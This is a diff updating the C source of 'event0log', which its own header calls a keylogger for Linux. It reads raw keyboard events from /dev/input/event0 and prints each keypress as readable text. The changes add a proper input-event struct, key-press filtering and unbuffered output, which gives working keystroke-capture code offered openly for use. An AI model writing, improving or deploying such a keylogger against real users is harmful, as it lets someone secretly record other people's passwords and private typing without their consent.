@@ -1,8 +1,8 @@
-/* event0log.c v0.6
- * <~~Harvie 2oo8
+/* event0log.c v0.7
+ * <~~Harvie 2oo8-2o21
  * THX2:	Dayvee (Idea), joe@aol.com (Reversing),
  *				-=Punka][Tux=- (BugReport),
- *				Warriant's code (Inspiration), Linus (God Blessed Linux)
+ *				Warriant's code (Inspiration), Linus (Linux)
  *
  * Converts /dev/input/event0 format to ASCII. (If you have nore keyboards,)
  * In other words: this is keylogger for Linux.
@@ -29,8 +29,17 @@
 
 #include <stdio.h>
 #include <stdlib.h>
+#include <stdint.h>
+#include <unistd.h>
 #include <signal.h>
 #define DEFAULTINPUT "/dev/input/event0"
+
+typedef struct __attribute__((__packed__)) input_event_s {
+	struct timeval time;
+	unsigned short type;
+	unsigned short code;
+	unsigned int value;
+} input_event_t;
 
 #define MAXSTROKE 127 //Set higest keystroke code in DB (lower will not be converted)
 char *strokes[] = { //KeyStroke DB for english QUERTZ keyboard:
@@ -91,18 +100,19 @@ int main(int argc, char *argv[]) {
 		printf("Failed to open file!\n\n");
 		return(1);
 	}
-	
-	printf("Keystroke DB size: %d B (0-%d)\n\n", sizeof(strokes), MAXSTROKE);	
+	setbuf(stdout, NULL);
 
-	unsigned char keystroke[17];
+	printf("Keystroke DB size: %d B (0-%d)\n\n", sizeof(strokes), MAXSTROKE);
+
+	input_event_t input_event;
 	while(1) {
-		read(0, keystroke, 16);
-		if((int)keystroke[12] > 0 && (int)keystroke[12] < 6) {
-			if(keystroke[10] <= MAXSTROKE) {
-				printf("%s", strokes[keystroke[10]]);
-			} else {
-				printf("<%d>", keystroke[10]);
-			}
+		read(0, &input_event, sizeof(input_event_t));
+		if(input_event.type != 1 || input_event.value != 1) continue;
+		//printf("\nTYPE:%d\tCODE:%d\tVAL:%d\t", input_event.type, input_event.code, input_event.value);
+		if(input_event.code <= MAXSTROKE) {
+			printf("%s", strokes[input_event.code]);
+		} else {
+			printf("<%d>", input_event.code);
 		}
 	}
 
